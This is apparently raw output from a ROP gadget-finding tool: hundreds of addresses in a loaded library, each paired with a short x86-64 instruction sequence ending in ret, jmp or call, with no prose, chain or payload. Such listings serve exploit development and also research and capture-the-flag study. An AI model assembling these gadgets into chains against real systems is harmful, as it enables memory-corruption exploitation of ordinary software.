0x00002aaaaab6b96c : add dword ptr [rbp - 0xf], esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab6b7d4 : add dword ptr [rbp - 0xf], esi ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b87c : add dword ptr [rbp - 0xf], esi ; xor eax, eax ; ret
0x00002aaaaabd6239 : add dword ptr [rbp], ebx ; xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac2fbc2 : add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab4c9c3 : add dword ptr [rbx + 0x18], ebp ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac10625 : add dword ptr [rbx + 0x28], esp ; mov qword ptr [rbx + 0x20], r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba97c2 : add dword ptr [rbx + 0x294803e0], eax ; ret 0x148
0x00002aaaaaad771e : add dword ptr [rbx + 0x2b], 0x821055b8 ; ret 0x617e
0x00002aaaaabe2fce : add dword ptr [rbx + 0x38], ebp ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8fa8d : add dword ptr [rbx + 0x41], ebx ; mov dword ptr [rdx + 0xc], edi ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaabf13f8 : add dword ptr [rbx + 0x460f09fb], eax ; ret
0x00002aaaaab2a57c : add dword ptr [rbx + 0x5d], ebx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabaa044 : add dword ptr [rbx + 0x5d], ebx ; pop r12 ; ret
0x00002aaaaac03ea8 : add dword ptr [rbx + 0x94806e3], eax ; ret
0x00002aaaaac70d0b : add dword ptr [rbx + 0xe], edx ; enter 0x4201, 0xe ; rol byte ptr [rcx], 3 ; ret 0xe01
0x00002aaaaabaa041 : add dword ptr [rbx + 4], 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80a6b : add dword ptr [rbx + rcx*4 + 4], eax ; xchg dword ptr [rbp - 0x7b], eax ; sal byte ptr [rbp - 0x35], 0xf3 ; ret
0x00002aaaaab71f05 : add dword ptr [rbx + rdi + 0xf], esi ; mov dh, 0x45 ; ret 0x8348
0x00002aaaaab6ffc1 : add dword ptr [rbx + rdi + 0xf], esi ; mov dh, 0x55 ; ret 0x8348
0x00002aaaaabab70a : add dword ptr [rbx - 0x3d], ebx ; nop dword ptr [rax] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaaba5a9f : add dword ptr [rbx - 0x7414fd38], eax ; nop dword ptr [rax] ; ret
0x00002aaaaabf8042 : add dword ptr [rbx - 0x77], edx ; ror dword ptr [rdi], cl ; xchg eax, esi ; ret 0xfb83
0x00002aaaaaba5b7f : add dword ptr [rbx - 0x7b14fd36], eax ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab08391 : add dword ptr [rbx - 0x7cb70030], eax ; ret
0x00002aaaaab8b559 : add dword ptr [rbx - 0x7cb7fe15], eax ; ret 0x8504
0x00002aaaaabab1bf : add dword ptr [rbx - 0x7cb7fe3b], eax ; ret
0x00002aaaaabacdd4 : add dword ptr [rbx - 0x7cb7fe40], eax ; ret 0x4801
0x00002aaaaab36b9b : add dword ptr [rbx - 0x7cf0f706], eax ; xchg eax, edx ; add byte ptr [rax], al ; add dh, dh ; ret 0x7504
0x00002aaaaac90884 : add dword ptr [rbx], eax ; cmc ; add al, byte ptr [rax] ; ret
0x00002aaaaac794a2 : add dword ptr [rbx], eax ; mov edi, 0x380e0a01 ; ret
0x00002aaaaac796da : add dword ptr [rbx], eax ; or eax, 0x380e0a03 ; ret
0x00002aaaaac70d13 : add dword ptr [rbx], eax ; ret 0xe01
0x00002aaaaac90881 : add dword ptr [rbx], ecx ; fadd dword ptr [rcx] ; add esi, ebp ; add al, byte ptr [rax] ; ret
0x00002aaaaac067d1 : add dword ptr [rcx + 0x1b802], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaab6e194 : add dword ptr [rcx + 0x29], ecx ; ret
0x00002aaaaab80b7f : add dword ptr [rcx + 0x39], eax ; ret
0x00002aaaaab693d0 : add dword ptr [rcx + 0x39], ecx ; ret
0x00002aaaaab93749 : add dword ptr [rcx + 0x39], ecx ; ret 0x850f
0x00002aaaaaaf8dea : add dword ptr [rcx + 0x39], ecx ; ret 0xe077
0x00002aaaaaaf9298 : add dword ptr [rcx + 0x39], ecx ; ret 0xe277
0x00002aaaaabfdeb0 : add dword ptr [rcx + 0x5c], eax ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaabb82c0 : add dword ptr [rcx + 0x63], ecx ; ret
0x00002aaaaab862c1 : add dword ptr [rcx + 0xf], eax ; xchg eax, ebp ; ret 0x2041
0x00002aaaaab02712 : add dword ptr [rcx + rdi - 0x7d], esi ; ret
0x00002aaaaac0ef4c : add dword ptr [rcx + rdx*2 + 0x48], esi ; add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1b987 : add dword ptr [rcx - 0x3a], eax ; add al, 0x24 ; and byte ptr [rax - 0x77], cl ; ret 0x8949
0x00002aaaaabadd4e : add dword ptr [rcx - 0x74b7c7ba], ecx ; or byte ptr [r9 + 0x63], r9b ; ret 0x4c6
0x00002aaaaab56542 : add dword ptr [rcx - 0x75], ecx ; push rax ; or dh, dh ; ret 0xf04
0x00002aaaaab76f16 : add dword ptr [rcx - 0x776b7fe], ecx ; ret
0x00002aaaaab41208 : add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x00002aaaaab20ccc : add dword ptr [rcx - 0x77], ecx ; push rbp ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaab97545 : add dword ptr [rcx - 0x7d], ecx ; ret
0x00002aaaaaaf7d2d : add dword ptr [rcx - 0x7d], ecx ; ret 0x4101
0x00002aaaaabf830f : add dword ptr [rcx - 0x7d], ecx ; ret 0x4102
0x00002aaaaab6f764 : add dword ptr [rcx - 0x7d], ecx ; ret 0x4201
0x00002aaaaab6edc7 : add dword ptr [rcx - 0x7d], ecx ; ret 0x4301
0x00002aaaaab06491 : add dword ptr [rcx - 0x7d], ecx ; ret 0x4804
0x00002aaaaabf8114 : add dword ptr [rcx - 0x7d], ecx ; ret 0x4c02
0x00002aaaaabe2275 : add dword ptr [rcx - 0x7d], ecx ; ret 0x8408
0x00002aaaaab96b69 : add dword ptr [rcx - 0x7f], eax ; ret
0x00002aaaaab622e7 : add dword ptr [rcx], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac882f5 : add dword ptr [rcx], 0 ; or byte ptr [rdx - 0xa], dl ; call qword ptr [rax]
0x00002aaaaabfef8b : add dword ptr [rcx], 0xbe0f0000 ; ret 0xe883
0x00002aaaaac6d885 : add dword ptr [rcx], 0xf65d8400 ; call rsp
0x00002aaaaab808eb : add dword ptr [rcx], eax ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaabf7d2b : add dword ptr [rcx], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac6c55d : add dword ptr [rcx], eax ; add byte ptr [rcx + rax*4], dh ; out dx, eax ; jmp rsp
0x00002aaaaaba1e24 : add dword ptr [rcx], ebx ; push rsp ; jne 0xccdb5 ; mov eax, 0x7d00 ; ret
0x00002aaaaabab605 : add dword ptr [rcx], ebx ; rol byte ptr [rbx - 0x3f7cfd20], 8 ; ret
0x00002aaaaab93b3b : add dword ptr [rcx], ebx ; sal bh, 0xd0 ; add eax, 0x16e ; ret
0x00002aaaaabab64f : add dword ptr [rcx], ebx ; sal bh, 0xd0 ; and eax, 2 ; ret
0x00002aaaaabde123 : add dword ptr [rcx], edi ; fmul dword ptr [rdi] ; ret
0x00002aaaaabf82d5 : add dword ptr [rcx], edi ; jb 0x1232ce ; mov eax, 0xffffffff ; ret
0x00002aaaaabbc54b : add dword ptr [rcx], edi ; ret
0x00002aaaaabad9b9 : add dword ptr [rcx], edi ; ret 0xe875
0x00002aaaaabba243 : add dword ptr [rcx], edi ; ror byte ptr [rdi], 1 ; ret 0x3941
0x00002aaaaab55204 : add dword ptr [rcx], edx ; add cl, ch ; ret 0xfffe
0x00002aaaaac5ca6d : add dword ptr [rcx], esi ; add dword ptr [rdi + 1], ecx ; outsb dx, byte ptr [rsi] ; add dword ptr [rax - 0x78], esp ; jmp rdx
0x00002aaaaac105a0 : add dword ptr [rdi + 0x28], 4 ; mov eax, 1 ; ret
0x00002aaaaac10560 : add dword ptr [rdi + 0x28], edx ; mov eax, 1 ; ret
0x00002aaaaac105ef : add dword ptr [rdi + 0x28], esi ; mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaac5ca6f : add dword ptr [rdi + 1], ecx ; outsb dx, byte ptr [rsi] ; add dword ptr [rax - 0x78], esp ; jmp rdx
0x00002aaaaac489ca : add dword ptr [rdi + 3], esi ; ret
0x00002aaaaabe5dbb : add dword ptr [rdi + rax - 0x257cb800], edx ; add ecx, dword ptr [rax + 0x29] ; ret 0x3949
0x00002aaaaab6b766 : add dword ptr [rdi + rcx - 0x4a], eax ; adc dword ptr [rbp + 0x38], eax ; ror byte ptr [rdi], 1 ; xchg eax, esp ; ret
0x00002aaaaab69e07 : add dword ptr [rdi - 0x1a], edi ; ret
0x00002aaaaac84493 : add dword ptr [rdi], 2 ; cwde ; ret
0x00002aaaaac7f353 : add dword ptr [rdi], 2 ; ret
0x00002aaaaac8fc63 : add dword ptr [rdi], 3 ; insb byte ptr [rdi], dx ; add dword ptr [rdx], ecx ; ret
0x00002aaaaac8277b : add dword ptr [rdi], 3 ; popfq ; add ecx, dword ptr [rdx] ; ret
0x00002aaaaabf9580 : add dword ptr [rdi], ecx ; add eax, 0x48c48348 ; pop rbx ; pop rbp ; ret
0x00002aaaaac09dac : add dword ptr [rdi], ecx ; enter 0x289, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac09515 : add dword ptr [rdi], ecx ; enter 0x4189, 0x48 ; mov eax, 1 ; ret
0x00002aaaaaba9fb8 : add dword ptr [rdi], ecx ; lahf ; ret 0x82eb
0x00002aaaaab02e35 : add dword ptr [rdi], ecx ; mov bh, 0xc0 ; ret
0x00002aaaaaafa942 : add dword ptr [rdi], ecx ; mov dh, 0x34 ; adc dword ptr [rax + 0x39], ecx ; ret 0x8840
0x00002aaaaab730b3 : add dword ptr [rdi], ecx ; mov esi, 0x75c9840f ; in eax, dx ; xor eax, eax ; ret
0x00002aaaaab72f73 : add dword ptr [rdi], ecx ; mov esi, 0xc984070c ; jne 0x9df72 ; ret
0x00002aaaaab72f2f : add dword ptr [rdi], ecx ; mov esi, 0xd2840714 ; jne 0x9df32 ; ret
0x00002aaaaab73003 : add dword ptr [rdi], ecx ; mov esi, 0xf2390714 ; je 0x9e00a ; ret
0x00002aaaaab96801 : add dword ptr [rdi], ecx ; sahf ; ret 0x1fbd
0x00002aaaaab7ee4c : add dword ptr [rdi], ecx ; scasd eax, dword ptr [rdi] ; ret 0x74e9
0x00002aaaaab7ee37 : add dword ptr [rdi], ecx ; scasd eax, dword ptr [rdi] ; ret 0xaf0f
0x00002aaaaab093b3 : add dword ptr [rdi], ecx ; test byte ptr [rsi], bh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaac3cede : add dword ptr [rdi], ecx ; test dword ptr [rbx + 3], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaabb8a12 : add dword ptr [rdi], ecx ; test dword ptr [rbx - 0xa000000], esi ; ret 0x7420
0x00002aaaaab32530 : add dword ptr [rdi], ecx ; test dword ptr [rcx - 0x7600000a], ecx ; ret
0x00002aaaaabc0309 : add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0x8341
0x00002aaaaabf3e13 : add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xc085
0x00002aaaaab1bdbc : add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xd084
0x00002aaaaabc0b1b : add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xf0e9
0x00002aaaaab7ed15 : add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xfd83
0x00002aaaaac108be : add dword ptr [rdi], ecx ; xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaac10767 : add dword ptr [rdi], ecx ; xchg eax, esp ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaab7f210 : add dword ptr [rdx + 0x2b], 0xd9748104 ; ret
0x00002aaaaab76ed4 : add dword ptr [rdx + 0x48028801], ecx ; mov eax, edi ; ret
0x00002aaaaac70d0f : add dword ptr [rdx + 0xe], eax ; rol byte ptr [rcx], 3 ; ret 0xe01
0x00002aaaaab7ea5c : add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab40417 : add dword ptr [rdx + 4], 1 ; ret
0x00002aaaaab40478 : add dword ptr [rdx + 4], 1 ; xor eax, eax ; ret
0x00002aaaaab7400d : add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaabddb2b : add dword ptr [rdx + rax*2], 1 ; ret
0x00002aaaaac7844e : add dword ptr [rdx + rax], -0xc ; ret
0x00002aaaaab9f583 : add dword ptr [rdx - 0x76b7ffd1], esp ; ret 0x8d48
0x00002aaaaac797ad : add dword ptr [rdx], 0x43 ; ret
0x00002aaaaac7bb0e : add dword ptr [rdx], 0x4b ; ret
0x00002aaaaac8f12c : add dword ptr [rdx], 0x51 ; ret
0x00002aaaaac84104 : add dword ptr [rdx], 0x53 ; ret
0x00002aaaaac82b8d : add dword ptr [rdx], 0x54 ; ret
0x00002aaaaac871db : add dword ptr [rdx], 0x5b ; ret
0x00002aaaaac73fb4 : add dword ptr [rdx], 0x63 ; ret
0x00002aaaaac746f4 : add dword ptr [rdx], 0x6f ; ret
0x00002aaaaac77414 : add dword ptr [rdx], 0x77 ; ret
0x00002aaaaac7421d : add dword ptr [rdx], 2 ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaac76c8c : add dword ptr [rdx], 2 ; pop rsi ; ret
0x00002aaaaac76a64 : add dword ptr [rdx], 2 ; push rsi ; ret
0x00002aaaaac7bb04 : add dword ptr [rdx], 2 ; ret
0x00002aaaaac89fec : add dword ptr [rdx], 2 ; xchg eax, ecx ; ret
0x00002aaaaabf811f : add dword ptr [rdx], eax ; pop rbx ; ret
0x00002aaaaac729a9 : add dword ptr [rdx], ecx ; ret
0x00002aaaaabf811e : add dword ptr [rdx], r8d ; pop rbx ; ret
0x00002aaaaab51ba8 : add dword ptr [rip + 0x348bb5], 1 ; ret
0x00002aaaaac07c19 : add dword ptr [rsi + 0xc], edi ; xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab76e65 : add dword ptr [rsi + 0xf], esp ; adc eax, dword ptr [rdx] ; mov rax, rdi ; ret
0x00002aaaaac7b5ef : add dword ptr [rsi + rax*4], 3 ; mov word ptr [rdx], es ; push rdx ; ret
0x00002aaaaac7585e : add dword ptr [rsi + rcx + 0x10], ecx ; je 0x1a0874 ; ret
0x00002aaaaac7586c : add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaab76ee7 : add dword ptr [rsi - 0x77], esp ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaac7d260 : add dword ptr [rsi], 0x77 ; ret
0x00002aaaaac788fe : add dword ptr [rsi], 0xa ; ret
0x00002aaaaac80700 : add dword ptr [rsi], 2 ; ret
0x00002aaaaac78970 : add dword ptr [rsi], 2 ; xchg eax, ebp ; ret
0x00002aaaaac7b0c5 : add dword ptr [rsi], 3 ; mov byte ptr [rcx], al ; ret
0x00002aaaaac8429e : add dword ptr [rsp + rbp*2], 0xa ; ret
0x00002aaaaab6dfbe : add dword ptr [rsp + rdi + 0xf], esi ; mov dh, 0x45 ; ret 0x8349
0x00002aaaaabab74c : add dword ptr [rsp + rdi*4 - 0x7d], esi ; jrcxz 0xd6763 ; je 0xd66f3 ; pop rbx ; ret
0x00002aaaaac82e2d : add dword ptr cs:[rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaab71f04 : add dword ptr cs:[rbx + rdi + 0xf], esi ; mov dh, 0x45 ; ret 0x8348
0x00002aaaaac83dbd : add dword ptr ds:[rax], eax ; adc byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab093b6 : add dword ptr ds:[rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaac83d5d : add dword ptr ds:[rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83dd5 : add dword ptr ds:[rax], eax ; sub byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac21c57 : add dword ptr es:[rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac82545 : add dword ptr es:[rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac6d32d : add dword ptr fs:[rax], eax ; add al, 0x21 ; cmc ; jmp rsp
0x00002aaaaabab64e : add dword ptr gs:[rcx], ebx ; sal bh, 0xd0 ; and eax, 2 ; ret
0x00002aaaaab5c2ae : add dword ptr ss:[rax], eax ; add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbx ; call rax
0x00002aaaaac8362d : add dword ptr ss:[rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac374a0 : add dword ptr ss:[rax], eax ; mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaac8359d : add dword ptr ss:[rax], eax ; nop ; hlt ; jmp qword ptr [rsi]
0x00002aaaaab5ffab : add eax, 0x10 ; ret
0x00002aaaaab637a1 : add eax, 0x10e4a ; ret
0x00002aaaaac08e52 : add eax, 0x14634800 ; nop ; add rax, rdx ; jmp rax
0x00002aaaaab01b3a : add eax, 0x15f406 ; ret
0x00002aaaaaaf5932 : add eax, 0x16b154 ; ret
0x00002aaaaaaf5942 : add eax, 0x16d066 ; ret
0x00002aaaaab93b40 : add eax, 0x16e ; ret
0x00002aaaaab5ff5f : add eax, 0x1713c ; ret
0x00002aaaaab5dcff : add eax, 0x1777c ; ret
0x00002aaaaab6363b : add eax, 0x1b330 ; ret
0x00002aaaaab62a97 : add eax, 0x1ba24 ; cmove rax, rdx ; ret
0x00002aaaaac91605 : add eax, 0x1e70000 ; add byte ptr [rax], al ; ret 4
0x00002aaaaac7e0f4 : add eax, 0x2300e44 ; ret 0xe0a
0x00002aaaaac7a054 : add eax, 0x2300e4a ; ret
0x00002aaaaac7c204 : add eax, 0x2300e55 ; ret
0x00002aaaaac48805 : add eax, 0x252242 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac489b3 : add eax, 0x25375c ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac488a1 : add eax, 0x254e8a ; test eax, eax ; jne 0x1738ba ; ret
0x00002aaaaabd21c0 : add eax, 0x26 ; mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; ret
0x00002aaaaab63015 : add eax, 0x26 ; ret
0x00002aaaaac15335 : add eax, 0x2840d6 ; call qword ptr [rax]
0x00002aaaaac14d22 : add eax, 0x2846e9 ; call qword ptr [rax]
0x00002aaaaac188b1 : add eax, 0x284e7a ; test eax, eax ; jne 0x1438cb ; xor eax, eax ; ret
0x00002aaaaac18881 : add eax, 0x284eaa ; test eax, eax ; jne 0x14389b ; xor eax, eax ; ret
0x00002aaaaac18851 : add eax, 0x284eda ; test eax, eax ; jne 0x14386b ; xor eax, eax ; ret
0x00002aaaaac18821 : add eax, 0x284f0a ; test eax, eax ; jne 0x14383b ; xor eax, eax ; ret
0x00002aaaaac187f1 : add eax, 0x284f3a ; test eax, eax ; jne 0x14380b ; xor eax, eax ; ret
0x00002aaaaac187c1 : add eax, 0x284f6a ; test eax, eax ; jne 0x1437db ; xor eax, eax ; ret
0x00002aaaaac0d2d2 : add eax, 0x28aba1 ; cmp dword ptr fs:[rax], 0x18 ; je 0x1382eb ; ret
0x00002aaaaac0c792 : add eax, 0x28b701 ; add rsp, 8 ; ret
0x00002aaaaac0c762 : add eax, 0x28b799 ; add rsp, 8 ; ret
0x00002aaaaac12181 : add eax, 0x28b7da ; test eax, eax ; je 0x13d19b ; xor eax, eax ; ret
0x00002aaaaac0c702 : add eax, 0x28b881 ; add rsp, 8 ; ret
0x00002aaaaac0c732 : add eax, 0x28b8a9 ; add rsp, 8 ; ret
0x00002aaaaab61e43 : add eax, 0x29000000 ; ret
0x00002aaaaab96bba : add eax, 0x2907fec1 ; ret 0x8944
0x00002aaaaab96cfa : add eax, 0x2941c229 ; ret 0x6b45
0x00002aaaaabfce02 : add eax, 0x29b1e1 ; mov rax, qword ptr fs:[rax] ; ret
0x00002aaaaac009ca : add eax, 0x29c3ed ; add rsp, 8 ; ret
0x00002aaaaac009b1 : add eax, 0x29c406 ; test eax, eax ; je 0x12b9c9 ; ret
0x00002aaaaabffdca : add eax, 0x29cf71 ; pop rbx ; ret
0x00002aaaaabffd92 : add eax, 0x29cfa9 ; pop rbx ; ret
0x00002aaaaabffcd3 : add eax, 0x29d068 ; pop rbx ; ret
0x00002aaaaabfc74b : add eax, 0x2a0314 ; test eax, eax ; je 0x127761 ; ret
0x00002aaaaabf53e2 : add eax, 0x2a4491 ; ret
0x00002aaaaabf4aa0 : add eax, 0x2a4dbb ; add rsp, 8 ; ret
0x00002aaaaabe9ef9 : add eax, 0x2b2222 ; pop rbp ; ret
0x00002aaaaabe9982 : add eax, 0x2b2781 ; test rax, rax ; je 0x11499a ; ret
0x00002aaaaabe960f : add eax, 0x2b4118 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaabe9461 : add eax, 0x2b42ca ; test eax, eax ; jne 0x11447b ; xor eax, eax ; ret
0x00002aaaaabe9431 : add eax, 0x2b42fa ; test eax, eax ; jne 0x11444b ; xor eax, eax ; ret
0x00002aaaaabe9401 : add eax, 0x2b432a ; test eax, eax ; jne 0x11441b ; xor eax, eax ; ret
0x00002aaaaabe93d1 : add eax, 0x2b435a ; test eax, eax ; jne 0x1143eb ; xor eax, eax ; ret
0x00002aaaaabe93a1 : add eax, 0x2b438a ; test eax, eax ; jne 0x1143bb ; xor eax, eax ; ret
0x00002aaaaabe9371 : add eax, 0x2b43ba ; test eax, eax ; jne 0x11438b ; xor eax, eax ; ret
0x00002aaaaabe9341 : add eax, 0x2b43ea ; test eax, eax ; jne 0x11435b ; xor eax, eax ; ret
0x00002aaaaabe9311 : add eax, 0x2b441a ; test eax, eax ; jne 0x11432b ; xor eax, eax ; ret
0x00002aaaaabe92e1 : add eax, 0x2b444a ; test eax, eax ; jne 0x1142fb ; xor eax, eax ; ret
0x00002aaaaabe9281 : add eax, 0x2b44aa ; test eax, eax ; jne 0x11429b ; xor eax, eax ; ret
0x00002aaaaabe9251 : add eax, 0x2b44da ; test eax, eax ; jne 0x11426b ; xor eax, eax ; ret
0x00002aaaaabe9221 : add eax, 0x2b450a ; test eax, eax ; jne 0x11423b ; xor eax, eax ; ret
0x00002aaaaabe91f1 : add eax, 0x2b453a ; test eax, eax ; jne 0x11420b ; xor eax, eax ; ret
0x00002aaaaabe91c1 : add eax, 0x2b456a ; test eax, eax ; jne 0x1141db ; xor eax, eax ; ret
0x00002aaaaabe9191 : add eax, 0x2b459a ; test eax, eax ; jne 0x1141ab ; xor eax, eax ; ret
0x00002aaaaabe9161 : add eax, 0x2b45ca ; test eax, eax ; jne 0x11417b ; xor eax, eax ; ret
0x00002aaaaabe9131 : add eax, 0x2b45fa ; test eax, eax ; jne 0x11414b ; xor eax, eax ; ret
0x00002aaaaabe9101 : add eax, 0x2b462a ; test eax, eax ; jne 0x11411b ; xor eax, eax ; ret
0x00002aaaaabe90d1 : add eax, 0x2b465a ; test eax, eax ; jne 0x1140eb ; xor eax, eax ; ret
0x00002aaaaabe90a1 : add eax, 0x2b468a ; test eax, eax ; jne 0x1140bb ; xor eax, eax ; ret
0x00002aaaaabe9071 : add eax, 0x2b46ba ; test eax, eax ; jne 0x11408b ; xor eax, eax ; ret
0x00002aaaaabe9041 : add eax, 0x2b46ea ; test eax, eax ; jne 0x11405b ; xor eax, eax ; ret
0x00002aaaaabe9011 : add eax, 0x2b471a ; test eax, eax ; jne 0x11402b ; xor eax, eax ; ret
0x00002aaaaabe8fe1 : add eax, 0x2b474a ; test eax, eax ; jne 0x113ffb ; xor eax, eax ; ret
0x00002aaaaabe8fb1 : add eax, 0x2b477a ; test eax, eax ; jne 0x113fcb ; xor eax, eax ; ret
0x00002aaaaabe8f81 : add eax, 0x2b47aa ; test eax, eax ; jne 0x113f9b ; xor eax, eax ; ret
0x00002aaaaabe8f51 : add eax, 0x2b47da ; test eax, eax ; jne 0x113f6b ; xor eax, eax ; ret
0x00002aaaaabe8f21 : add eax, 0x2b480a ; test eax, eax ; jne 0x113f3b ; xor eax, eax ; ret
0x00002aaaaabe8ef1 : add eax, 0x2b483a ; test eax, eax ; jne 0x113f0b ; xor eax, eax ; ret
0x00002aaaaabde752 : add eax, 0x2b9719 ; mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaabdda40 : add eax, 0x2ba7f7 ; add al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaabdda33 : add eax, 0x2ba804 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaabd6346 : add eax, 0x2c3465 ; pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd63d0 : add eax, 0x2c4e4b ; add rsp, 0x18 ; ret
0x00002aaaaabd637c : add eax, 0x2c4edf ; pop rbp ; pop r12 ; ret
0x00002aaaaabd5e38 : add eax, 0x2c5393 ; add rsp, 8 ; ret
0x00002aaaaabd5dd9 : add eax, 0x2c5412 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac3cf64 : add eax, 0x2c5850f ; add byte ptr [rax], al ; ret
0x00002aaaaabd2906 : add eax, 0x2c6e95 ; mov rdx, rax ; jmp 0xfd8a6
0x00002aaaaabd2870 : add eax, 0x2c6f2b ; add rsp, 8 ; ret
0x00002aaaaabd3efb : add eax, 0x2c71f0 ; add rsp, 8 ; ret
0x00002aaaaabd3ce3 : add eax, 0x2c7418 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd39c9 : add eax, 0x2c7652 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd273f : add eax, 0x2c8854 ; ret
0x00002aaaaabd257f : add eax, 0x2c8a14 ; ret
0x00002aaaaabd23ac : add eax, 0x2c8be7 ; add rsp, 8 ; ret
0x00002aaaaac7b0c3 : add eax, 0x3068345 ; mov byte ptr [rcx], al ; ret
0x00002aaaaab92fae : add eax, 0x307b3d ; lea rcx, qword ptr [rax + r12] ; mov rdx, rax ; jmp 0xbdfcb
0x00002aaaaab8fc2e : add eax, 0x30ad8d ; add rsp, 8 ; ret
0x00002aaaaab914d7 : add eax, 0x30bffc ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab61c27 : add eax, 0x338c5c ; add rsp, 8 ; ret
0x00002aaaaab5cb55 : add eax, 0x33dca6 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab5ca3e : add eax, 0x33ddb9 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab59c61 : add eax, 0x33e4de ; test eax, eax ; js 0x84c7a ; ret
0x00002aaaaab58560 : add eax, 0x33f97b ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab56166 : add eax, 0x341c65 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab55f41 : add eax, 0x341e8a ; mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaab58571 : add eax, 0x34224e ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab584f7 : add eax, 0x3422e0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab51b12 : add eax, 0x347a09 ; ret
0x00002aaaaab51c16 : add eax, 0x348b49 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab3fc85 : add eax, 0x35aa76 ; pop rbx ; pop rbp ; ret
0x00002aaaaabea682 : add eax, 0x37c19 ; ret
0x00002aaaaabea772 : add eax, 0x37ec9 ; ret
0x00002aaaaab1aaf4 : add eax, 0x37fb07 ; mov byte ptr [rax + rdx], 0 ; ret
0x00002aaaaab0b8bc : add eax, 0x38c7cb ; mov eax, edx ; ret
0x00002aaaaab0b881 : add eax, 0x38c802 ; ret
0x00002aaaaab0b871 : add eax, 0x38c816 ; ret
0x00002aaaaac86a59 : add eax, 0x38d048c ; mov es, word ptr [rdx] ; add ah, bh ; ret
0x00002aaaaab100e2 : add eax, 0x38d36f ; add rsp, 8 ; ret
0x00002aaaaab0a301 : add eax, 0x39342a ; test eax, eax ; jne 0x3531a ; ret
0x00002aaaaab029cd : add eax, 0x39541e ; mov qword ptr [rax], rdx ; ret
0x00002aaaaab01ae3 : add eax, 0x397f58 ; mov byte ptr [rip + 0x397faf], dl ; ret
